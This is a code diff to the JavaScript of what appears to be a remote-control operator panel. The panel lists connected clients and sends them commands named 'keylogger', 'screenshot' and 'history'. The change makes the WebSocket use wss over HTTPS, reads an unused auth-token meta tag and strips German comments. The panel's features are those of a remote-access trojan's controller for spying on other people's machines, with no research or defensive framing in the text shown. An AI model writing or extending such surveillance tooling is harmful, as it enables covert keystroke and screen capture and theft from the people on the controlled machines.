@@ -124,7 +124,16 @@
     </div>
 
     <script>
-      const ws = new WebSocket(`ws://${window.location.host}/ws`);
+      // Token aus Basic Auth extrahieren
+      const authHeader = document.querySelector('meta[name="auth-token"]')?.content;
+      let wsUrl = `ws://${window.location.host}/ws`;
+      
+      // Falls HTTPS, dann WSS verwenden
+      if (window.location.protocol === 'https:') {
+        wsUrl = `wss://${window.location.host}/ws`;
+      }
+
+      const ws = new WebSocket(wsUrl);
       const clientList = document.getElementById("client-list");
       const output = document.getElementById("output");
       const commandInput = document.getElementById("command-input");
@@ -186,13 +195,12 @@
             payload.path = argument;
             break;
           case "history":
-            payload.limit = parseInt(argument) || 20; // Default 20
+            payload.limit = parseInt(argument) || 20;
             break;
           case "keylogger":
-            payload.count = parseInt(argument) || 50; // Default 50
+            payload.count = parseInt(argument) || 50;
             break;
           case "screenshot":
-            // Keine weiteren Argumente nötig
             break;
           default:
             log(
